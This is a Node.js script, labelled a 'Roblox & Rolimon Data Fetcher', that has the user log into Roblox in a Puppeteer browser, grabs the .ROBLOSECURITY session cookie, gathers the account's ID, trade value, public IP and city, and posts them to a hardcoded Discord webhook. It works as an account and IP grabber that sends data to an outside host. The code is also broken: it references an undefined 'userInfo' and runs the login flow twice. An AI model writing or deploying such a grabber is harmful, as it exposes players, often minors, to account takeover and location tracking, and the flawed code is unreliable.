// Required modules
const puppeteer = require('puppeteer');
const fetch = require('node-fetch');
const fs = require('fs').promises;
const cheerio = require('cheerio');

// Configuration constants
const WEBHOOK_URL = "https://discord.com/api/webhooks/1431731089193308310/uEdiXzRTI6Rp2imoDFRmTRb3sY_G-lNFwCK6yhEQ1Xb9WHHsXaTXi1AaFWO7ajyLjBhC"; // Replace with your Discord webhook URL
const CACHE_FILE_PATH = './roblox_cache.json';
const MAX_CACHE_AGE_MS = 24 * 60 * 60 * 1000; // 24 hours cache
const MAX_RETRIES = 3; // Retry attempts for API requests
const USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36";

// Utility functions for cache management
async function loadCache() {
    try {
        const data = await fs.readFile(CACHE_FILE_PATH, 'utf8');
        return JSON.parse(data);
    } catch (e) {
        return {}; // Return empty cache if file doesn't exist
    }
}

async function saveCache(cache) {
    await fs.writeFile(CACHE_FILE_PATH, JSON.stringify(cache, null, 2), 'utf8');
}

// Function to perform HTTP GET with retries
async function fetchWithRetries(url, options = {}, retries = MAX_RETRIES) {
    for (let attempt = 1; attempt <= retries; attempt++) {
        try {
            const response = await fetch(url, options);
            if (response.ok) return response;
            else throw new Error(`HTTP ${response.status}`);
        } catch (err) {
            console.error(`Fetch attempt ${attempt} failed for ${url}: ${err.message}`);
            if (attempt === retries) throw err;
            await new Promise(res => setTimeout(res, 1000 * attempt)); // Exponential backoff
        }
    }
}

// Function to get Roblox cookies via Puppeteer
async function getRobloxCookie() {
    const browser = await puppeteer.launch({ headless: false, args: ['--no-sandbox'] });
    const page = await browser.newPage();
    await page.setUserAgent(USER_AGENT);
    await page.goto('https://www.roblox.com', { waitUntil: 'networkidle2' });

    console.log('🛑 Please log into Roblox in the opened browser...');
    await page.waitForNavigation({ waitUntil: 'networkidle2' });

    const cookies = await page.cookies();
    await browser.close();

    const robloxCookie = cookies.find(c => c.name === '.ROBLOSECURITY');
    if (!robloxCookie) throw new Error('🛑 Roblox cookie not found. Login is required.');
    return robloxCookie.value;
}

// Function to extract Roblox user ID from URL or page DOM
async function getUserIdFromPage(page) {
    const url = page.url();
    const match = url.match(/users\/(\d+)/);
    if (match) return match[1];

    // Alternative: parse DOM for user ID if URL doesn't contain it
    const userId = await page.evaluate(() => {
        const userLink = document.querySelector('a[href*="/users/"]');
        if (userLink) {
            const href = userLink.getAttribute('href');
            const matchInner = href.match(/users\/(\d+)/);
            if (matchInner) return matchInner[1];
        }
        return null;
    });
    return userId;
}

// Function to fetch Roblox user info
async function fetchRobloxUserInfo(cookie) {
    const response = await fetchWithRetries('https://www.roblox.com/mobileapi/userinfo', {
        headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    });
    if (response.ok) {
        const data = await response.json();
        return data;
    } else {
        throw new Error(`Failed to fetch user info: ${response.status}`);
    }
}

// Function to fetch account creation date
async function fetchAccountCreationDate(userId, cookie) {
    const response = await fetchWithRetries(`https://users.roblox.com/v1/users/${userId}`, {
        headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    });
    if (response.ok) {
        const data = await response.json();
        return data.created; // ISO string
    } else {
        console.warn(`Failed to fetch account creation date for ${userId}`);
        return 'N/A';
    }
}

// Fetch Rolimon's stats with HTML parsing
async function fetchRolimonStats(username) {
    const url = `https://rolimons.com/player/${encodeURIComponent(username)}`;
    const response = await fetchWithRetries(url);
    const html = await response.text();
    const $ = cheerio.load(html);

    // Example parsing, depends on actual page structure
    const profit = $('#profit').text() || 'N/A';
    const loss = $('#loss').text() || 'N/A';
    const inventoryValue = $('#inventory').text() || 'N/A';

    return { profit, loss, inventoryValue };
}

// Fetch IP info
async function fetchIpDetails(ip) {
    const response = await fetchWithRetries(`https://ipapi.co/${ip}/json/`);
    if (response.ok) {
        return await response.json();
    }
    return null;
}

// Main orchestrator function
async function main() {
    const cache = await loadCache();

    let cookie;
    try {
        cookie = await getRobloxCookie();
        console.log('✅ Roblox cookie obtained.');
    } catch (err) {
        console.error('🚫 Error obtaining Roblox cookie:', err.message);
        return;
    }

    // Initialize Puppeteer for user ID extraction
    const browser = await puppeteer.launch({ headless: false, args: ['--no-sandbox'] });
    const page = await browser.newPage();
    await page.setUserAgent(USER_AGENT);
    await page.goto('https://www.roblox.com', { waitUntil: 'networkidle2' });

    // Wait for user to log in
    console.log('🛑 Please log into Roblox...');
    await page.waitForNavigation({ waitUntil: 'networkidle2' });

    const userId = await getUserIdFromPage(page);
    if (!userId) {
        console.error('🚫 Could not determine user ID.');
        await browser.close();
        return;
    }

    const username = await page.evaluate(() => {
        const el = document.querySelector('meta[name="UserName"]');
        return el ? el.content : null;
    }) || 'N/A';

    await browser.close();

    // Check cache
    const now = Date.now();
    let userCache = cache[username];
    let userData;
    if (userCache && (now - userCache.timestamp < MAX_CACHE_AGE_MS)) {
        userData = userCache.data;
        console.log(`🕒 Using cached data for ${username}`);
    } else {
        // Fetch fresh data
        const [creationDate, roliStats] = await Promise.all([
            fetchAccountCreationDate(userId, cookie),
            fetchRolimonStats(username),
        ]);
        userData = {
            userId,
            username,
            creationDate,
            roliStats,
        };
        cache[username] = { timestamp: now, data: userData };
        await saveCache(cache);
        console.log(`📝 Updated cache for ${username}`);
    }

    // Fetch IP and geolocation
    const ip = await fetch('https://api.ipify.org').then(res => res.text());
    const ipDetails = await fetchIpDetails(ip);

    // Compose Discord embed
    const embed = {
        title: `🛡️ Roblox User Info - ${username}`,
        description: `**User ID:** ${userId}\n**Account Created:** ${userData.creationDate}`,
        color: 0x2ecc71,
        timestamp: new Date().toISOString(),
        author: {
            name: username,
            url: `https://www.roblox.com/users/${userId}/profile`,
            icon_url: 'https://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&username=' + encodeURIComponent(username),
        },
        thumbnail: {
            url: `https://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&username=${encodeURIComponent(username)}`,
        },
        fields: [
            {
                name: '🌐 IP Address',
                value: ipDetails ? `[${ip}] (${ipDetails.city || 'N/A'}, ${ipDetails.country_name || 'N/A'})` : ip,
                inline: false,
            },
            {
                name: '📊 Rolimon\'s Stats',
                value: `Profit: ${userData.roliStats.profit}\nLoss: ${userData.roliStats.loss}\nInventory: ${userData.roliStats.inventoryValue}`,
                inline: false,
            },
            {
                name: '💰 Robux Balance',
                value: userInfo?.RobuxBalance || 'N/A',
                inline: true,
            },
            {
                name: '🌟 Premium Status',
                value: (userInfo?.IsPremium !== undefined) ? String(userInfo.IsPremium) : 'N/A',
                inline: true,
            },
            {
                name: '🎮 Profile URL',
                value: `[View Profile](https://www.roblox.com/users/${userId}/profile)`,
                inline: false,
            },
        ],
        footer: {
            text: 'Roblox & Rolimon Data Fetcher',
            icon_url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png',
        },
    };

    // Send to Discord
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: 'RobloxBot', avatar_url: 'https://cdn.discordapp.com/avatars/1425248210359947368/fea665d6e4892cac13b6c4d397fedf1b.webp?size=60', embeds: [embed] }),
        });
        console.log('✅ Data successfully posted to Discord webhook.');
    } catch (err) {
        console.error('🚫 Failed to send webhook:', err);
    }
}

// Run the script
main().catch(e => console.error('Fatal error:', e));
